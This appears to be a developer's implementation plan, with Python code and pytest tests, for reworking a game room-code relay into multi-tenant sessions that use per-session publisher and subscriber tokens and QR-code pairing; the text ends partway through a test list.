# Multi-Tenant Relay Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **First action when execution begins:** copy this file to `docs/superpowers/plans/2026-08-03-multi-tenant-relay.md` and commit it, so the plan lives with the repo like every previous one.

## Context

The relay that shipped on `multi-protocol-support` serves exactly one host. It holds a single current-code slot and a single publisher token, so a second host publishing overwrites the first, and every phone receives both hosts' codes interleaved with no way to tell them apart. A phone is bound to *the relay*, not to *the PC that paired it*.

The user wants a **public service**: many independent game nights running at once, each phone receiving only the codes from the host that paired it, pairing done by scanning a QR code on the host's screen, and pairings that last one session rather than forever.

The approved design is `docs/superpowers/specs/2026-08-03-multi-tenant-relay-design.md`. It makes the system **smaller** — the token file, the pairing-code exchange, the revocation path and the global admin credential all disappear.

**Goal:** Rework the relay so a session is the unit of tenancy, and wire the host PC to create one and display it as a QR code at game launch.

**Architecture:** `POST /sessions` mints a session id plus a publisher and a subscriber token. The host shows `https://<relay>/j#<id>.<subscriber-token>` as a QR; the credential sits in the URL fragment so it never reaches a server log. The phone subscribes to that session's SSE stream alone. All state is in memory in one process; sessions expire 4 hours after their last publish or subscribe.

**Tech Stack:** Python 3.11+, Starlette + uvicorn (relay only), stdlib `urllib` and `tkinter` on the host, `qrencode` as a host binary dependency, pytest with `asyncio_mode = auto`.

### What an adversarial review of this design already caught

A review agent was pointed at the spec and an earlier draft of this design and asked to break it. Six real defects came back and are already fixed in the tasks below; they are listed here so nobody "simplifies" them back in:

1. **A session with a phone attached was evicted mid-game.** A whole game night is normally *one* publish — the publisher de-duplicates and a pack keeps one room code across many games — and the draft touched the session only when a subscriber first connected. Fixed by touching on every SSE keepalive (Task 2).
2. **A non-draining subscriber was unregistered but never closed**, so its generator outlived eviction and DELETE, and it freed a subscriber slot for a replacement to repeat the trick. Fixed by closing the queue properly on `QueueFull` (Task 2).
3. **An expired session answered 401 instead of the spec's 404**, so the publisher could not distinguish "stop trying forever" from "wrong token". Fixed by splitting existence from authorisation (Task 2).
4. **`set -euo pipefail` would have turned "relay is down" into "the game never launches"** — the exact failure spec §8 forbids. Fixed by putting the call in an `if` condition (Task 6).
5. **The subscriber token would have been world-readable in `qrencode`'s command line.** Fixed by feeding the payload on stdin (Task 4).
6. **Blobcast calls `set_code` once per websocket frame**, and a failed publish is deliberately not recorded as sent, so a dead session would have retried and logged at frame rate all game. Fixed with a permanent-failure latch (Task 5).

It also confirmed as sound: the fragment-carried credential, the no-`await` window in `subscribe`, auth-before-rate-limit, 503-not-evict, and the fact that no structural path exists for one session's code to reach another's subscriber once everything is keyed by session id.

## Global Constraints

Every task's requirements implicitly include these.

- **Python 3.11 or newer.** Relay and host both.
- **The relay's only dependencies are `starlette>=0.37` and `uvicorn[standard]>=0.30`** (`relay/requirements.txt`). It deploys to a VPS alone and must never import from `extractor/` or `host/`.
- **The extractor and host add no runtime dependency.** `extractor/` runs inside `mitmdump`; `host/` runs from the Steam launch option. Stdlib only. `host/session.py` must not import `tkinter`.
- **Room codes are never logged.** Not in the relay, not in the publisher, not in the addon, not on disk except the launcher's redacted `last-run.log`.
- **Tokens are never logged and never appear on a command line** (a command line is world-readable via `ps`). They travel in environment variables, request headers, and a mode-0600 file.
- **`https://` is enforced client-side.** TLS terminates at a reverse proxy in front of the relay, so `extractor/relay_publisher.py` and `host/session.py` are the only places it can be checked. Both refuse any other scheme.
- **Losing the relay must never cost a game night.** Every relay failure degrades to LAN-only and lets the game launch.
- **`secrets.compare_digest` for every token comparison**, guarded by `isinstance`/non-empty/`isascii()` — Starlette decodes headers as latin-1, and `compare_digest` raises `TypeError` on non-ASCII input, which would turn a junk credential into a 500.
- **Relay tests use the live-uvicorn `serving()` helper, never `httpx.ASGITransport`** — it drains the whole app coroutine before returning a response and deadlocks against the infinite SSE generator (encode/httpx#2186). Any test asserting on a *successful* `/subscribe` must use `http.stream(...)`, never a buffering `http.get(...)`.

## Baseline

`main` of this work is branch `multi-protocol-support`, HEAD `d4316be`, tree clean, **180 tests passing** (`.venv/bin/python -m pytest -q`).

Task 0 deletes 43 of them (`test_pair_cli.py` 7, `test_relay_tokens.py` 12, `test_relay_app.py` 24), leaving 137. Tasks 1–6 rebuild and add. **Do not assert a target total** — record the number after each task and check it moved in the direction the task intended.

## File Structure

| File | Fate | Responsibility |
|---|---|---|
| `relay/state.py` | rewritten | Sessions, tokens, freshness, capacity, eviction. Pure: no HTTP, no disk, injected clock. |
| `relay/app.py` | rewritten | Six routes, SSE queues, per-session rate limiters. Thin. |
| `relay/tokens.py` | **deleted** | Token file is gone. |
| `pair.py` | **deleted** | Pairing-code CLI is gone. |
| `host/__init__.py` | new | Package marker so `python3 -m host.qr_window` works. |
| `host/session.py` | new | Host-side relay client + `PairingWaiter`. All the testable logic. Stdlib only. |
| `host/qr_window.py` | new | Tk glue over `host/session.py`. Hand-verified. Holds no logic worth testing. |
| `extractor/relay_publisher.py` | modified | Session-scoped publish URL; no retry on 4xx. |
| `extractor/addon.py` | modified | `_build_sinks()` reads three variables instead of two. |
| `jbvip-run.sh` | modified | Creates the session, shows the QR, sources the credentials, deletes the session on exit. |
| `tests/helpers.py` | new | `serving()`, `Clock`, `first_event()`, `new_session()` — shared by the app, host and seam tests. |
| `tests/test_relay_state.py` | rewritten | |
| `tests/test_relay_app.py` | rewritten | Including the headline isolation test. |
| `tests/test_host_session.py` | new | |
| `tests/test_relay_publisher.py` | modified | |
| `tests/test_addon.py` | modified | Only the `_build_sinks` block (lines 353–411). |
| `tests/test_launcher.py` | modified | The relay-config block moved; the token variable is gone. |
| `tests/test_relay_tokens.py`, `tests/test_pair_cli.py` | **deleted** | |
| `relay/README.md`, `README.md` | modified | |

---

### Task 0: Delete the superseded single-tenant components

Spec §10. Doing this first keeps every later commit green: `relay/app.py` imports `relay.tokens` and constructs `RelayState(publisher_token, ...)`, so rewriting `state.py` in Task 1 would leave a broken module behind if `app.py` were still present. `relay/app.py` is rewritten from nothing in Task 2, so deleting it here loses no work.

Nothing outside `relay/` and `tests/` imports any of these — verified with
`grep -rln "relay.tokens\|import pair" --include='*.py' .`

**Files:**
- Delete: `relay/tokens.py`, `tests/test_relay_tokens.py`
- Delete: `pair.py`, `tests/test_pair_cli.py`
- Delete: `relay/app.py`, `tests/test_relay_app.py`

**Interfaces:**
- Consumes: nothing.
- Produces: nothing. `relay/state.py` is untouched and its 35 tests still pass.

- [ ] **Step 1: Confirm nothing outside the deletion set depends on them**

```bash
grep -rn "relay\.tokens\|relay/tokens\|import pair\b\|from pair\b\|JBVIP_PUBLISHER_TOKEN" \
  --include='*.py' --include='*.sh' . | grep -v __pycache__ | grep -v docs/superpowers
```

Expected: hits only in `relay/app.py`, `tests/test_relay_app.py`, `tests/test_relay_tokens.py`, `tests/test_pair_cli.py`, `pair.py` — all of which are being deleted. Anything else is a dependency this plan missed; stop and report it.

- [ ] **Step 2: Delete the files**

```bash
git rm relay/tokens.py tests/test_relay_tokens.py pair.py tests/test_pair_cli.py \
       relay/app.py tests/test_relay_app.py
```

- [ ] **Step 3: Run the suite**

Run: `.venv/bin/python -m pytest -q`
Expected: **137 passed**. (180 − 24 − 12 − 7.) If collection *errors* rather than simply losing tests, something still imports a deleted module.

- [ ] **Step 4: Commit**

```bash
git commit -m "refactor: delete the single-tenant token store and pairing CLI

The multi-tenant relay issues per-session tokens at session creation, so
there is nothing to persist, nothing to revoke and no pairing code to
exchange. relay/app.py is deleted here and rebuilt on the new state layer."
```

---

### Task 1: `relay/state.py` — sessions, capacity, eviction

Spec §5.1. Pure state: no HTTP, no disk, injected clock, so the entire decision surface tests as plain function calls. This is the substance of the rework.

**Files:**
- Rewrite: `relay/state.py`
- Rewrite: `tests/test_relay_state.py`

**Interfaces:**
- Consumes: nothing.
- Produces, for Tasks 2 and 5:
  - Constants `FRESH_SECONDS: float`, `SESSION_IDLE_SECONDS: int`, `MAX_SESSIONS: int`, `MAX_SUBSCRIBERS_PER_SESSION: int`, `SESSION_ID_BYTES: int`, `TOKEN_BYTES: int`
  - `CodeRecord(code: str, ts: float, received_at: float)` — frozen dataclass
  - `Session(session_id, publisher_token, subscriber_token, created_at, last_activity, record)` — mutable dataclass
  - `SessionCapacityError(RuntimeError)`
  - `RateLimiter(limit: int, window_seconds: float, now=time.monotonic)` with `.allow() -> bool` — carried over unchanged
  - `RelayState(now=time.time)` with `create_session() -> Session`, `session(session_id) -> Session | None`, `is_publisher(session_id, token) -> bool`, `is_subscriber(session_id, token) -> bool`, `publish(session_id, code, ts) -> bool`, `current_code(session_id) -> CodeRecord | None`, `touch(session_id) -> None`, `expires_at(session_id) -> float | None`, `evict_expired() -> list[str]`, `delete_session(session_id) -> bool`

**Two design decisions the implementer must not "simplify":**

1. **`create_session()` does not evict.** It raises `SessionCapacityError` at the cap instead. Eviction is the app layer's job because evicting a session means closing its live SSE queues, and the queues cannot live in a pure module. `evict_expired()` returns the ids precisely so the caller can do that.
2. **`publish()` raises `KeyError` for an unknown session** rather than returning a sentinel. The app authenticates first, and authentication already requires the session to exist, so this only fires on a genuine bug or a session evicted mid-request.

- [ ] **Step 1: Write the failing tests**

Replace `tests/test_relay_state.py` entirely.

```python
import math
import time

import pytest

from relay.state import (
    MAX_SESSIONS,
    RateLimiter,
    RelayState,
    Session,
    SessionCapacityError,
    SESSION_IDLE_SECONDS,
)


class Clock:
    def __init__(self, t=1000.0):
        self.t = t

    def __call__(self):
        return self.t


def make(clock=None):
    return RelayState(now=clock or Clock())


# --- session creation ---------------------------------------------------

def test_a_new_session_gets_an_id_and_two_distinct_tokens():
    session = make().create_session()
    assert isinstance(session, Session)
    assert session.session_id
    assert session.publisher_token != session.subscriber_token
    assert session.record is None


def test_two_sessions_share_no_identifier_or_token():
    state = make()
    a, b = state.create_session(), state.create_session()
    assert len({a.session_id, b.session_id}) == 2
    assert len({a.publisher_token, b.publisher_token,
                a.subscriber_token, b.subscriber_token}) == 4


def test_a_session_can_be_looked_up_by_id():
    state = make()
    session = state.create_session()
    assert state.session(session.session_id) is session


def test_an_unknown_session_id_is_none_not_an_error():
    state = make()
    assert state.session("nope") is None
    assert state.session(None) is None
    assert state.session(17) is None


# --- authentication -----------------------------------------------------

def test_the_publisher_token_authenticates_its_own_session():
    state = make()
    session = state.create_session()
    assert state.is_publisher(session.session_id, session.publisher_token)
    assert state.is_subscriber(session.session_id, session.subscriber_token)


def test_a_session_id_is_not_a_capability_on_its_own():
    # The whole point of two credentials: knowing an id must buy nothing.
    state = make()
    session = state.create_session()
    assert not state.is_publisher(session.session_id, session.subscriber_token)
    assert not state.is_subscriber(session.session_id, session.publisher_token)
    assert not state.is_publisher(session.session_id, "")


def test_another_sessions_token_is_rejected():
    state = make()
    a, b = state.create_session(), state.create_session()
    assert not state.is_publisher(a.session_id, b.publisher_token)
    assert not state.is_subscriber(a.session_id, b.subscriber_token)


def test_a_token_for_an_unknown_session_is_rejected():
    state = make()
    session = state.create_session()
    assert not state.is_publisher("nope", session.publisher_token)


@pytest.mark.parametrize("token", ["Bearer \xff", "ÿ", 17, None, ""])
def test_a_junk_token_is_false_not_an_exception(token):
    # Starlette decodes headers as latin-1, so a byte >= 0x80 arrives as a
    # non-ASCII str, and secrets.compare_digest raises TypeError on those.
    # An unauthenticated caller must get a False, never a 500.
    state = make()
    session = state.create_session()
    assert state.is_publisher(session.session_id, token) is False


# --- publishing ---------------------------------------------------------

def test_publishing_stores_the_code_and_reports_the_change():
    state = make()
    session = state.create_session()
    assert state.publish(session.session_id, "WEWW", 1000.0) is True
    assert state.current_code(session.session_id).code == "WEWW"


def test_republishing_the_same_code_reports_no_change():
    state = make()
    session = state.create_session()
    state.publish(session.session_id, "WEWW", 1000.0)
    assert state.publish(session.session_id, "WEWW", 1001.0) is False
    assert state.publish(session.session_id, "ZZZZ", 1002.0) is True


def test_publishing_to_one_session_leaves_the_other_alone():
    # The headline requirement, at the state layer.
    state = make()
    a, b = state.create_session(), state.create_session()
    state.publish(a.session_id, "WEWW", 1000.0)
    assert state.current_code(a.session_id).code == "WEWW"
    assert state.current_code(b.session_id) is None


def test_publishing_to_an_unknown_session_raises_key_error():
    with pytest.raises(KeyError):
        make().publish("nope", "WEWW", 1000.0)


@pytest.mark.parametrize("code", ["", "x", "toolongcode", "not a code", 17, None])
def test_an_implausible_code_is_refused(code):
    state = make()
    session = state.create_session()
    with pytest.raises(ValueError):
        state.publish(session.session_id, code, 1000.0)


@pytest.mark.parametrize("ts", [math.nan, math.inf, -math.inf])
def test_a_non_finite_timestamp_is_refused(ts):
    # json.loads accepts a bare NaN, `now - nan > window` is False, so a NaN
    # stamp would be permanently fresh and json.dumps would re-emit it as
    # JSON no client can parse.
    state = make()
    session = state.create_session()
    with pytest.raises(ValueError):
        state.publish(session.session_id, "WEWW", ts)


# --- freshness ----------------------------------------------------------

def test_a_code_older_than_the_window_is_withheld():
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    state.publish(session.session_id, "WEWW", 1000.0)
    clock.t = 1000.0 + 121.0
    assert state.current_code(session.session_id) is None


def test_freshness_uses_the_relays_clock_not_the_publishers_stamp():
    # A dual-boot host writing localtime to the RTC is hours out. Its stamp
    # must not be able to make a code look permanently fresh or permanently
    # stale — only the relay's own receipt time counts.
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    state.publish(session.session_id, "WEWW", 500_000.0)
    record = state.current_code(session.session_id)
    assert record.ts == 500_000.0       # the host's stamp travels to clients
    assert record.received_at == 1000.0  # the relay's clock gates freshness
    clock.t = 1121.0
    assert state.current_code(session.session_id) is None


def test_the_current_code_of_an_unknown_session_is_none():
    assert make().current_code("nope") is None


# --- activity and expiry ------------------------------------------------

def test_publishing_extends_the_session():
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    clock.t = 2000.0
    state.publish(session.session_id, "WEWW", 2000.0)
    assert session.last_activity == 2000.0
    assert state.expires_at(session.session_id) == 2000.0 + SESSION_IDLE_SECONDS


def test_touching_extends_the_session():
    # A phone listening all evening to a host that has not started a new room
    # must not have its session collected out from under it.
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    clock.t = 2000.0
    state.touch(session.session_id)
    assert session.last_activity == 2000.0


def test_touching_an_unknown_session_is_a_no_op():
    make().touch("nope")  # must not raise


def test_expires_at_is_none_for_an_unknown_session():
    assert make().expires_at("nope") is None


def test_an_idle_session_is_evicted_and_its_id_returned():
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    clock.t = 1000.0 + SESSION_IDLE_SECONDS + 1
    assert state.evict_expired() == [session.session_id]
    assert state.session(session.session_id) is None


def test_a_session_kept_alive_by_a_subscriber_is_not_evicted():
    clock = Clock(1000.0)
    state = make(clock)
    session = state.create_session()
    for _ in range(5):
        clock.t += SESSION_IDLE_SECONDS - 1
        state.touch(session.session_id)
        assert state.evict_expired() == []
    assert state.session(session.session_id) is not None


def test_eviction_takes_only_the_idle_session():
    clock = Clock(1000.0)
    state = make(clock)
    stale, live = state.create_session(), state.create_session()
    clock.t += SESSION_IDLE_SECONDS + 1
    state.touch(live.session_id)
    assert state.evict_expired() == [stale.session_id]
    assert state.session(live.session_id) is not None


# --- capacity -----------------------------------------------------------

def test_creation_is_refused_at_capacity_rather_than_evicting_a_live_session():
    # Spec §8: never evict a live session to admit a stranger.
    state = make()
    sessions = [state.create_session() for _ in range(MAX_SESSIONS)]
    with pytest.raises(SessionCapacityError):
        state.create_session()
    assert state.session(sessions[0].session_id) is not None


def test_deleting_a_session_frees_capacity():
    state = make()
    sessions = [state.create_session() for _ in range(MAX_SESSIONS)]
    assert state.delete_session(sessions[0].session_id) is True
    assert state.create_session() is not None


def test_deleting_an_unknown_session_reports_false():
    assert make().delete_session("nope") is False


def test_evicting_frees_capacity():
    clock = Clock(1000.0)
    state = make(clock)
    for _ in range(MAX_SESSIONS):
        state.create_session()
    clock.t += SESSION_IDLE_SECONDS + 1
    assert len(state.evict_expired()) == MAX_SESSIONS
    assert state.create_session() is not None


# --- rate limiter (carried over unchanged) ------------------------------

def test_the_rate_limiter_allows_up_to_the_limit_then_refuses():
    clock = Clock(0.0)
    limiter = RateLimiter(limit=2, window_seconds=60.0, now=clock)
    assert [limiter.allow() for _ in range(3)] == [True, True, False]


def test_the_rate_limiter_forgets_hits_outside_the_window():
    clock = Clock(0.0)
    limiter = RateLimiter(limit=1, window_seconds=60.0, now=clock)
    assert limiter.allow() is True
    clock.t = 61.0
    assert limiter.allow() is True


def test_the_rate_limiter_defaults_to_the_monotonic_clock():
    # Never the wall clock: an NTP step backwards would widen the window.
    limiter = RateLimiter(limit=1, window_seconds=60.0)
    assert limiter._now is time.monotonic
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `.venv/bin/python -m pytest tests/test_relay_state.py -q`
Expected: a collection error — `ImportError: cannot import name 'Session' from 'relay.state'`.

- [ ] **Step 3: Rewrite `relay/state.py`**

```python
"""Relay decisions with no HTTP and no disk, so they test as plain calls.

A *session* is the unit of tenancy: one host PC's game night. It owns its own
publisher and subscriber tokens and expires on its own, so two sessions can
never see each other's codes.

The room-code plausibility check duplicates `extractor.roomcode.looks_like_code`
on purpose: the relay deploys to a VPS on its own and must not import the
extractor package.
"""
import math
import secrets
import time
from dataclasses import dataclass, field

FRESH_SECONDS = 120.0
# Long enough not to cut a game night short, short enough that an abandoned
# session and every credential it issued are gone by the next day.
SESSION_IDLE_SECONDS = 4 * 3600
MAX_SESSIONS = 500
# A Jackbox room holds about ten players.
MAX_SUBSCRIBERS_PER_SESSION = 16
# 12 url-safe characters: short enough to sit in a QR code alongside a token,
# and it is never a credential on its own.
SESSION_ID_BYTES = 9
TOKEN_BYTES = 32


@dataclass(frozen=True)
class CodeRecord:
    """A published code and the two clocks that saw it.

    `ts` is when the host PC observed the code; it travels to clients, which
    run their own end-to-end freshness check against it. `received_at` is the
    relay's own clock and is what the freshness window here uses, so skew on
    the host's clock — a dual-boot PC with Windows writing localtime to the RTC
    is hours out — cannot make every code look stale or every code look fresh.
    """

    code: str
    ts: float
    received_at: float


@dataclass
class Session:
    """One game night. Mutable: `last_activity` and `record` change over its life.

    `session_id` is carried on the record so callers never have to pair it back
    up with its key in the session table.
    """

    session_id: str
    publisher_token: str
    subscriber_token: str
    created_at: float
    last_activity: float
    record: CodeRecord | None = None


class SessionCapacityError(RuntimeError):
    """Raised by create_session when MAX_SESSIONS live sessions already exist.

    Deliberately not "evict the oldest": a live game night must never be ended
    to admit a stranger (spec §8).
    """


def _looks_like_code(code) -> bool:
    return (
        isinstance(code, str)
        and 2 <= len(code) <= 8
        and code.isascii()
        and code.isalnum()
    )


def _token_matches(candidate, known: str) -> bool:
    # Starlette decodes headers as latin-1 per the ASGI spec, so any byte >=
    # 0x80 in an Authorization header arrives as a non-ASCII str — which
    # secrets.compare_digest raises TypeError on. Unauthenticated callers must
    # get a 401, not a traceback, so the ASCII check is part of the guard.
    if not isinstance(candidate, str) or not candidate or not candidate.isascii():
        return False
    return secrets.compare_digest(candidate, known)


class RateLimiter:
    """Sliding-window counter. `now` is injected so tests need not sleep."""

    def __init__(self, limit: int, window_seconds: float, now=time.monotonic):
        self._limit = limit
        self._window = window_seconds
        self._now = now
        self._hits: list[float] = []

    def allow(self) -> bool:
        cutoff = self._now() - self._window
        self._hits = [hit for hit in self._hits if hit > cutoff]
        if len(self._hits) >= self._limit:
            return False
        self._hits.append(self._now())
        return True


class RelayState:
    """The session table. Everything the relay decides, and nothing it does."""

    def __init__(self, now=time.time):
        self._now = now
        self._sessions: dict[str, Session] = {}

    # --- lifecycle ---
    def create_session(self) -> Session:
        """Mint a session. Raises SessionCapacityError when full.

        Does not evict internally: evicting a session means closing its live
        SSE queues, which only the app layer can do. Callers run
        `evict_expired()` first and close whatever it hands back.
        """
        if len(self._sessions) >= MAX_SESSIONS:
            raise SessionCapacityError("session capacity reached")
        now = self._now()
        session = Session(
            session_id=secrets.token_urlsafe(SESSION_ID_BYTES),
            publisher_token=secrets.token_urlsafe(TOKEN_BYTES),
            subscriber_token=secrets.token_urlsafe(TOKEN_BYTES),
            created_at=now,
            last_activity=now,
        )
        self._sessions[session.session_id] = session
        return session

    def session(self, session_id) -> Session | None:
        if not isinstance(session_id, str):
            return None
        return self._sessions.get(session_id)

    def delete_session(self, session_id) -> bool:
        """Drop a session. True when there was one to drop."""
        if not isinstance(session_id, str):
            return False
        return self._sessions.pop(session_id, None) is not None

    def evict_expired(self) -> list[str]:
        """Drop idle sessions and return their ids so their queues can be closed."""
        cutoff = self._now() - SESSION_IDLE_SECONDS
        dead = [
            session_id
            for session_id, session in self._sessions.items()
            if session.last_activity <= cutoff
        ]
        for session_id in dead:
            del self._sessions[session_id]
        return dead

    # --- authentication ---
    def is_publisher(self, session_id, token) -> bool:
        session = self.session(session_id)
        return session is not None and _token_matches(token, session.publisher_token)

    def is_subscriber(self, session_id, token) -> bool:
        session = self.session(session_id)
        return session is not None and _token_matches(token, session.subscriber_token)

    # --- room codes ---
    def publish(self, session_id, code, ts: float) -> bool:
        """Store the code. Returns True when this changed the session's code.

        Raises KeyError for an unknown session: callers authenticate first, and
        authenticating already proves the session exists.
        """
        session = self.session(session_id)
        if session is None:
            raise KeyError(session_id)
        if not _looks_like_code(code):
            raise ValueError("implausible room code")
        ts = float(ts)
        # json.loads accepts a bare NaN and `now - nan > window` is False, so a
        # NaN stamp would be permanently fresh and json.dumps would re-emit it
        # as JSON no client can parse.
        if not math.isfinite(ts):
            raise ValueError("ts must be a finite number")
        now = self._now()
        changed = session.record is None or session.record.code != code
        session.record = CodeRecord(code=code, ts=ts, received_at=now)
        session.last_activity = now
        return changed

    def current_code(self, session_id) -> CodeRecord | None:
        """The session's code, or None when absent or older than the window.

        Gated on the relay's own receipt time, never the publisher's stamp —
        see CodeRecord.
        """
        session = self.session(session_id)
        if session is None or session.record is None:
            return None
        if self._now() - session.record.received_at > FRESH_SECONDS:
            return None
        return session.record

    # --- activity ---
    def touch(self, session_id) -> None:
        """Mark the session live. Subscribing counts as activity, not just publishing."""
        session = self.session(session_id)
        if session is not None:
            session.last_activity = self._now()

    def expires_at(self, session_id) -> float | None:
        session = self.session(session_id)
        return None if session is None else session.last_activity + SESSION_IDLE_SECONDS
```

Remove the unused `field` import if the implementation ends up not needing it.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `.venv/bin/python -m pytest tests/test_relay_state.py -q`
Expected: PASS, roughly 35 tests.

Then the whole suite: `.venv/bin/python -m pytest -q` — expected 137 − 35 + (new count).

- [ ] **Step 5: Commit**

```bash
git add relay/state.py tests/test_relay_state.py
git commit -m "feat(relay): make a session the unit of tenancy

Each session owns its own code slot and its own publisher and subscriber
tokens, so two game nights cannot see each other's codes. Sessions expire
four hours after their last publish or subscribe; eviction returns the ids
it dropped so the app layer can close their streams."
```

---

### Task 2: `relay/app.py` — the six routes, and the isolation test

Spec §5.2. The app layer owns only what the pure layer cannot: live SSE queues and rate limiters. The headline test lives here.

**Files:**
- Create: `tests/helpers.py`
- Create: `relay/app.py`
- Create: `tests/test_relay_app.py`

**Interfaces:**
- Consumes, from Task 1: every name in `RelayState`'s Produces block.
- Produces, for Tasks 3 and 5:
  - HTTP surface: `POST /sessions` → 201 `{session_id, publisher_token, subscriber_token, expires_at}`; `GET /sessions/{id}` (publisher) → `{subscribers, expires_at}`; `POST /sessions/{id}/publish` (publisher) body `{code, ts?}` → 204; `GET /sessions/{id}/subscribe` (subscriber) → SSE of `{code, ts}`; `DELETE /sessions/{id}` (publisher) → 204; `GET /j` → HTML.
  - `build_app(state, *, create_limiter=None, publish_limiter_factory=None) -> Starlette`
  - `create_app() -> Starlette` — takes **no** environment variables.
  - `Relay` class, for the unit tests that poke `_queues` directly.
  - `tests/helpers.py`: `Clock`, `serving(app)`, `first_event(response, timeout=3.0)`, `stream_ends(response, timeout=3.0)`, `new_session(http)`, `auth(token)`.

**Three design decisions the implementer must not "simplify":**

1. **Rate limiting is global on `POST /sessions` and per-session on publish.** `POST /sessions` is unauthenticated, so a shared budget is the only option and the reverse proxy does per-client limiting (spec §3). Publishing is authenticated, so each session gets its own limiter — otherwise one noisy host 429s every other game night.
2. **Closing a stream uses a `None` sentinel on the queue.** When the queue is full the sentinel displaces a payload with `get_nowait()`, because a client that is not draining would otherwise keep the generator alive until its TCP connection died.
3. **`subscribe` has no `await` between the auth check and the `return`.** A code published in that window would be lost: seeded from `current_code()` before the queue is registered, and fanned out before the queue exists.

- [ ] **Step 1: Write `tests/helpers.py`**

Lifted from the deleted `tests/test_relay_app.py`, plus two additions, so the host and seam tests in Tasks 3 and 5 can reuse it.

```python
"""Shared plumbing for tests that need a real relay on a real socket."""
import asyncio
import contextlib
import json

import httpx
import uvicorn


class Clock:
    """An injectable wall clock that only moves when a test moves it."""

    def __init__(self, t=1000.0):
        self.t = t

    def __call__(self):
        return self.t


@contextlib.asynccontextmanager
async def serving(app):
    """Run the app on a real uvicorn server bound to an ephemeral port.

    httpx's ASGITransport drains the whole app coroutine before returning a
    response, which deadlocks against the deliberately-infinite SSE generator
    (encode/httpx#2186). A real server streams properly.
    """
    config = uvicorn.Config(app, host="127.0.0.1", port=0, log_level="warning")
    server = uvicorn.Server(config)
    task = asyncio.create_task(server.serve())
    try:
        while not server.started:
            if task.done():
                await task  # surfaces a startup failure instead of spinning
            await asyncio.sleep(0.01)
        port = server.servers[0].sockets[0].getsockname()[1]
        async with httpx.AsyncClient(base_url=f"http://127.0.0.1:{port}") as http:
            yield http
    finally:
        server.should_exit = True
        await task


async def first_event(response, timeout=3.0):
    """The first `data:` payload off an SSE response. Raises on timeout."""

    async def read():
        async for line in response.aiter_lines():
            if line.startswith("data: "):
                return json.loads(line[len("data: "):])
        return None

    return await asyncio.wait_for(read(), timeout)


async def stream_ends(response, timeout=3.0):
    """True once the server has closed the stream rather than holding it open."""

    async def drain():
        async for _ in response.aiter_lines():
            pass
        return True

    return await asyncio.wait_for(drain(), timeout)


async def new_session(http):
    """Create a session over HTTP and return its JSON body."""
    response = await http.post("/sessions")
    assert response.status_code == 201, response.text
    return response.json()


def auth(token):
    return {"Authorization": f"Bearer {token}"}
```

- [ ] **Step 2: Write the failing tests**

Create `tests/test_relay_app.py`. The seam tests (real publisher against real relay) are **not** here — they arrive in Task 5, once `RelayPublisher` is session-scoped.

```python
import asyncio
import contextlib

import pytest

from relay.app import Relay, build_app
from relay.state import (
    MAX_SESSIONS,
    MAX_SUBSCRIBERS_PER_SESSION,
    RateLimiter,
    RelayState,
    SESSION_IDLE_SECONDS,
)
from tests.helpers import Clock, auth, first_event, new_session, serving, stream_ends


def make(clock=None, **limiters):
    state = RelayState(now=clock or Clock())
    return state, build_app(state, **limiters)


def publish_url(session):
    return f"/sessions/{session['session_id']}/publish"


def subscribe_url(session):
    return f"/sessions/{session['session_id']}/subscribe"


# --- the headline requirement -------------------------------------------

async def test_a_subscriber_never_receives_another_sessions_code():
    """Two game nights at once, each blind to the other.

    This is the entire point of the rework. Nothing in the single-tenant
    suite could have caught the absence of it.
    """
    _, app = make()
    async with serving(app) as http:
        a, b = await new_session(http), await new_session(http)
        async with http.stream(
            "GET", subscribe_url(a), headers=auth(a["subscriber_token"])
        ) as to_a, http.stream(
            "GET", subscribe_url(b), headers=auth(b["subscriber_token"])
        ) as to_b:
            assert to_a.status_code == 200
            assert to_b.status_code == 200
            published = await http.post(
                publish_url(a),
                json={"code": "WEWW", "ts": 1000.0},
                headers=auth(a["publisher_token"]),
            )
            assert published.status_code == 204
            assert await first_event(to_a) == {"code": "WEWW", "ts": 1000.0}
            with pytest.raises(asyncio.TimeoutError):
                await first_event(to_b, timeout=0.5)


# --- session creation ---------------------------------------------------

async def test_creating_a_session_returns_an_id_and_two_tokens():
    _, app = make()
    async with serving(app) as http:
        response = await http.post("/sessions")
    assert response.status_code == 201
    body = response.json()
    assert set(body) == {
        "session_id", "publisher_token", "subscriber_token", "expires_at"
    }
    assert body["publisher_token"] != body["subscriber_token"]
    assert body["expires_at"] == 1000.0 + SESSION_IDLE_SECONDS


async def test_creating_a_session_needs_no_credential():
    # Anyone may run a game night: this is a public service.
    _, app = make()
    async with serving(app) as http:
        response = await http.post("/sessions")
    assert response.status_code == 201


async def test_creation_is_refused_at_capacity_rather_than_evicting():
    # Spec §8: never end a live game night to admit a stranger.
    state, app = make()
    for _ in range(MAX_SESSIONS):
        state.create_session()
    async with serving(app) as http:
        response = await http.post("/sessions")
    assert response.status_code == 503


# --- authentication -----------------------------------------------------

async def test_another_sessions_publisher_token_cannot_publish():
    state, app = make()
    async with serving(app) as http:
        a, b = await new_session(http), await new_session(http)
        response = await http.post(
            publish_url(a),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(b["publisher_token"]),
        )
    assert response.status_code == 401
    assert state.current_code(a["session_id"]) is None


async def test_another_sessions_subscriber_token_cannot_subscribe():
    _, app = make()
    async with serving(app) as http:
        a, b = await new_session(http), await new_session(http)
        response = await http.get(
            subscribe_url(a), headers=auth(b["subscriber_token"])
        )
    assert response.status_code == 401


async def test_the_subscriber_token_cannot_publish():
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(session["subscriber_token"]),
        )
    assert response.status_code == 401


async def test_the_publisher_token_cannot_subscribe():
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.get(
            subscribe_url(session), headers=auth(session["publisher_token"])
        )
    assert response.status_code == 401


@pytest.mark.parametrize(
    "method,path",
    [
        ("POST", "/sessions/nope/publish"),
